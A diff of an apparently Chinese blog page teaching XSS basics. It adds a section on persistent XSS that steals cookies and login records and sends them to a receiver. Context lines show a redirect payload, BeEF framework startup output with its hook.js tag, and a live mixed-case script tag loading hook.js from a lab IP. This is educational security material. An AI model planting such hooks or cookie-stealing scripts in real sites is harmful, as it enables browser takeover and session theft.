@@ -8,7 +8,7 @@
   
   
   
-  <title>XSS跨站脚本攻击基础 | JohnScott2046的博客</title>
+  <title>24XSS跨站脚本攻击基础 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,7 +254,7 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>XSS跨站脚本攻击基础</span>
+    <span>24XSS跨站脚本攻击基础</span>
   </h1>
   <div class="article-top-meta">
     <span>
@@ -405,12 +405,16 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;192.168.1.230&#x2F;&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="八、-XSS-beef-the-browser-exploition-framework"><a href="#八、-XSS-beef-the-browser-exploition-framework" class="headerlink" title="八、 XSS-beef  the browser exploition framework"></a>八、 XSS-beef  the browser exploition framework</h3><p>/usr/share/beef-xss<br>beef-xss</p>
+<h3 id="九、-XSS-beef-the-browser-exploition-framework"><a href="#九、-XSS-beef-the-browser-exploition-framework" class="headerlink" title="九、 XSS-beef  the browser exploition framework"></a>九、 XSS-beef  the browser exploition framework</h3><p>/usr/share/beef-xss<br>beef-xss</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[-] You are using the Default credentials</span><br><span class="line">[-] (Password must be different from &quot;beef&quot;)</span><br><span class="line">[-] Please type a new password for the beef user:</span><br><span class="line">[i] GeoIP database is missing</span><br><span class="line">[i] Run geoipupdate to download &#x2F; update Maxmind GeoIP database</span><br><span class="line">[*] Please wait for the BeEF service to start.</span><br><span class="line">[*]</span><br><span class="line">[*] You might need to refresh your browser once it opens.</span><br><span class="line">[*]</span><br><span class="line">[*]  Web UI: http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;ui&#x2F;panel</span><br><span class="line">[*]    Hook: &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;&lt;IP&gt;:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">[*] Example: &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="http://192.168.1.230:3000/ui/panel">http://192.168.1.230:3000/ui/panel</a> 输入用户名beef 密码为刚输入的初始密码</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.1.230:3000/hook.js">http://192.168.1.230:3000/hook.js</a> 攻击脚本的地址</p>
 <sCrIpt src="http://192.168.1.230:3000/hook.js"></scRipt>
+
+
+<h3 id="十、-XSS持久化如何实现"><a href="#十、-XSS持久化如何实现" class="headerlink" title="十、 XSS持久化如何实现"></a>十、 XSS持久化如何实现</h3><p>XSS持久化依赖于储存型XSS漏洞，当发现有存储型XSS漏洞时，会尝试插入一段JS代码用于窃取cookie，配合hook可以实现更多操作。</p>
+<p>持久化一般采用无感记录，如登录记录，cookie记录等，并发送到指定接收端。</p>
     </div>
   </div>
   
@@ -513,13 +517,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/25XSS-Labs/" target="_self">XSS-Labs</a>
+        <a href="/2021/25XSS-Labs/" target="_self">25XSS-Labs</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/23SQL%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/" target="_self">SQL注入-总结</a>
+        <a href="/2021/23SQL%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/" target="_self">23SQL注入-总结</a>
         <i class="iconfont icon-next"></i>
       </div>
     
